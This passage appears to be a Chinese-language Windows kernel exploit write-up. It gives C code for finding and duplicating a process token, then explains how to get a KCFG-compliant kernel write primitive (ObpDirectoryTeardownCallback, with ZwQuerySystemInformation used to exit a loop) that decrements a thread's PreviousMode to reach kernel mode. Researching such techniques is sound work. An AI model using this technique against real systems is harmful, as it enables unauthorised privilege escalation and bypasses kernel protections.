
```c
BOOL IsUserSidProcess(DWORD ProcessID, const wchar_t* SidName, PHANDLE hToken, TOKEN_TYPE TokenType)

{

    if(!ProcessID)

    {

        SetLastError(ERROR_INVALID_PARAMETER);

        return FALSE;

    }

    PTOKEN_USER tokenUser = NULL;

    BOOL result = FALSE;

    HANDLE hProcess = NULL;

    HANDLE hProcessToken = NULL;

    PSID sid = NULL;

    do

    {

        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION| PROCESS_QUERY_LIMITED_INFORMATION, FALSE, ProcessID);

        if (hProcess == NULL)

        {

            break;

        }

        DWORD Size = 0;

        if (!ConvertStringSidToSidW(SidName, &sid))

        {

            DWORD error = GetLastError();

            cout << "Failed to ConvertStringSidToSid. error code: " << error << endl;

            break;

        }

        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken))

        {

            DWORD error = GetLastError();

            cout << "Failed to OpenProcessToken. error code: " << error << endl;

            break;

        }

        if (!GetTokenInformation(hProcessToken, TokenUser, NULL, 0, &Size) && GetLastError()!= ERROR_INSUFFICIENT_BUFFER)

        {

            cout << "Failed to get buffer size." << endl;

            break;

        }

        tokenUser = (PTOKEN_USER)LocalAlloc(LPTR, Size);

        if (!tokenUser)

        {

            DWORD error = GetLastError();

            cout << "Failed to allocate memory. error code: " << error << endl;

            break;

        }

        if (!GetTokenInformation(hProcessToken, TokenUser, tokenUser, Size, &Size))

        {

            DWORD error = GetLastError();

            cout << "Failed to GetTokenInformation. error code: " << error << endl;

            break;

        }

        if (EqualSid(tokenUser->User.Sid,sid))

        {

            cout << "[PID:" << ProcessID << "] EqualSid 匹配成功！" << endl;

            result = TRUE;

            if (hToken)

            {

                if (!DuplicateTokenEx(hProcessToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenType, hToken))

                {

                    DWORD err = GetLastError();

                    cout << "Failed to Local Service DuplicateToken. error code: " << err << endl;

                    result = FALSE;

                }

            }

        }

    } while (FALSE);

    if (sid)

    {

        LocalFree(sid);

    }

    if (tokenUser)

    {

        LocalFree(tokenUser);

    }

    if (hProcess)

    {

        CloseHandle(hProcess);

    }

    if (hProcessToken)

    {

        CloseHandle(hProcessToken);

    }

    return result;

}
```

### 4.2 获取内核写原语并触发漏洞

我们并不能直接找碎片化的gadget作为原语，因为 `KCFG` 会验证回调函数的地址是否为合法的内核函数地址，如果不是合法函数地址，执行时就会导致蓝屏。

虽然 `KCFG` 和 `SMEP` 极大地限制了攻击者通过漏洞执行任意代码的难度，但实际上并不能阻止我们利用漏洞进行提权。

因为攻击者只需找到一个符合 `KCFG` 的合法内核写原语作为我们的回调函数，那这些安全机制自然就被绕过了。

[在nero22k的这篇文章](https://bbs.kanxue.com/elink@4bfK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6F1k6i4u0G2x3U0u0C8i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1k6H3L8%4y4@1M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3X3c8S2M7s2m8D9L8$3y4C8k6i4u0Q4x3X3c8V1M7X3W2$3k6i4u0Q4x3X3c8W2L8r3g2$3j5i4c8A6L8$3&6Q4x3X3c8G2k6W2)9J5k6s2m8J5K9i4k6A6L8r3g2Y4k6g2)9J5k6r3y4$3k6g2)9J5k6o6t1H3x3U0c8Q4x3X3b7J5x3e0x3K6z5q4)9J5c8R3`.`.)里讲过可以使用`ExpProfileDelete`进行内核写操作，将自己线程里的`PreviousMode`字段通过`ObfDereferenceObject`将其递减为0，从而将当前线程的权限提升为内核态。

虽然这是一个符合 `KCFG` 的函数，但实际上极力不推荐使用此函数，我通过 `IDA` 将其反汇编如下：

```
PAGE:00000001407570A0 ExpProfileDelete proc near              ; DATA XREF: .pdata:00000001403EC4F4↑o

PAGE:00000001407570A0                                         ; ExpProfileInitialization+46↓o

PAGE:00000001407570A0                 push    rbx

PAGE:00000001407570A2                 sub     rsp, 20h

PAGE:00000001407570A6                 cmp     qword ptr [rcx+30h], 0

PAGE:00000001407570AB                 mov     rbx, rcx

PAGE:00000001407570AE                 jz      short loc_1407570DA

PAGE:00000001407570B0                 mov     rcx, [rcx+28h]

PAGE:00000001407570B4                 call    KeStopProfile

PAGE:00000001407570B9                 mov     rdx, [rbx+38h]  ; MemoryDescriptorList

PAGE:00000001407570BD                 mov     rcx, [rbx+30h]  ; BaseAddress

PAGE:00000001407570C1                 call    MmUnmapLockedPages

PAGE:00000001407570C6                 mov     rcx, [rbx+38h]  ; MemoryDescriptorList

PAGE:00000001407570CA                 call    MmUnlockPages

PAGE:00000001407570CF                 mov     rcx, [rbx+28h]  ; P

PAGE:00000001407570D3                 xor     edx, edx        ; Tag

PAGE:00000001407570D5                 call    ExFreePoolWithTag

PAGE:00000001407570DA

PAGE:00000001407570DA loc_1407570DA:                          ; CODE XREF: ExpProfileDelete+E↑j

PAGE:00000001407570DA                 mov     rcx, [rbx]      ; Object

PAGE:00000001407570DD                 test    rcx, rcx

PAGE:00000001407570E0                 jz      short loc_1407570EC

PAGE:00000001407570E2                 mov     edx, 66507845h  ; Tag

PAGE:00000001407570E7                 call    ObfDereferenceObjectWithTag

PAGE:00000001407570EC

PAGE:00000001407570EC loc_1407570EC:                          ; CODE XREF: ExpProfileDelete+40↑j

PAGE:00000001407570EC                 add     rsp, 20h

PAGE:00000001407570F0                 pop     rbx

PAGE:00000001407570F1                 retn

PAGE:00000001407570F1 ExpProfileDelete endp
```

```
void __fastcall ExpProfileDelete(__int64 a1)

{

  if ( *(_QWORD *)(a1 + 0x30) )

  {

    KeStopProfile(*(_QWORD *)(a1 + 0x28));

    MmUnmapLockedPages(*(PVOID *)(a1 + 0x30), *(PMDL *)(a1 + 0x38));

    MmUnlockPages(*(PMDL *)(a1 + 0x38));

    ExFreePoolWithTag(*(PVOID *)(a1 + 0x28), 0);

  }

  if ( *(_QWORD *)a1 )

    ObfDereferenceObjectWithTag(*(PVOID *)a1, 0x66507845u);

}
```

在`ExpProfileDelete`中，我们发现该函数会检查`a1+0x30`处是否为0，若为非零值，就会执行该分支。`a1`是我们传入到内核的缓冲区基址，而我们最多也就传入了`0x18`或者`0x20`字节，而`a1+0x30`处的内存地址不属于我们传入的缓冲区，当对`a1+0x30`处的内存地址进行解映射操作时，会触发蓝屏。

我们用 `WinDbg` 给`ExpProfileDelete`函数下个断点：

![alt text](https://bbs.kanxue.com/upload/attach/202604/1061323_4HVYBEJ2G4RMGHU.png)

在`rcx+0x30`处，我们发现该地址的值为0，说明该分支不会执行。会继续执行`ObfDereferenceObjectWithTag`函数。

但当`rcx+0x30`处的内存地址不为0时，情况就不一样了：

![alt text](https://bbs.kanxue.com/upload/attach/202604/1061323_TVRUECU39B569A4.png)

如果我们再往下，就会执行第一个分支里面的代码，从而将`rcx+0x30`处的内存地址解映射，导致蓝屏。

值得庆幸的是，我找到了另一个相对更安全的内核写原语，那就是`ObpDirectoryTeardownCallback`函数，它同样也会调用`ObfDereferenceObjectWithTag`函数，将其递减为0，从而将当前线程的权限提升为内核态。

在找到`ObpDirectoryTeardownCallback`函数后，我们就可以顺理成章地将`(*a2)(userBuffer, v42)`的地址指向该函数，从而触发漏洞。

你以为这样就完事了吗？那就大错特错了，你确实成功触发了漏洞，但也因此导致了蓝屏或者永远留在了死循环中。

请看以下反 C 代码：

```
if ( a3 )
  {
    v7 = (*a2)(userBuffer, v42);
    if ( v7 < 0 )
      return (unsigned int)v7;
    v8 = *(_QWORD *)v43;
    v9 = 0x10000;
    v35 = *(_QWORD *)v43;
    pbInput = ExAllocatePoolWithTag((POOL_TYPE)512, 0x10000u, 0x48707041u);
    if ( !pbInput )
      return (unsigned int)-1073741801;
    v32 = 0;
    v11 = v8;
    NumberOfBytes = v8;
    cbInput = 0x10000;
    if ( v8 )
    {
      while ( 1 )
      {
        if ( cbInput > v11 )
          cbInput = v11;
        v7 = ((__int64 (__fastcall *)(__int64, __int64 *, _QWORD, PVOID))v39[1])(v40, &v32, cbInput, pbInput);
        if ( v7 < 0 )
          goto LABEL_74;
        if ( v32 )
        {
          v15 = v31;
        }
        ...
      }
    }
    ...
  }
```

我们需要给`((__int64 (__fastcall *)(__int64, __int64 *, _QWORD, PVOID))v39[1])(v40, &v32, cbInput, pbInput)`找一个合适的回调函数地址，使其返回的值小于0，从而跳出这个死循环。我觉得`ZwQuerySystemInformation`是一个很好的的选择，这个函数指针第一个参数传的就是地址值，而`ZwQuerySystemInformation`的第一个参数是枚举值，远小于地址值，若第一个参数是无效的枚举值，函数便会直接返回失败，也就是小于0的值，然后直接跳出循环。

以我对 Windows 内核的了解，`ObfDereferenceObjectWithTag`会对目标对象体对应的`OBJECT_HEADER`结构体中的`PointerCount`字段也就是在对象体的`0x30`负偏移处进行递减操作。所以我们在`APPID_KERNEL_EXPLOIT`第一个字段填写目标`PreviousMode`字段的地址加上`0x30`即可将`PreviousMode`字段递减为0，从而将当前线程的权限提升为内核态。
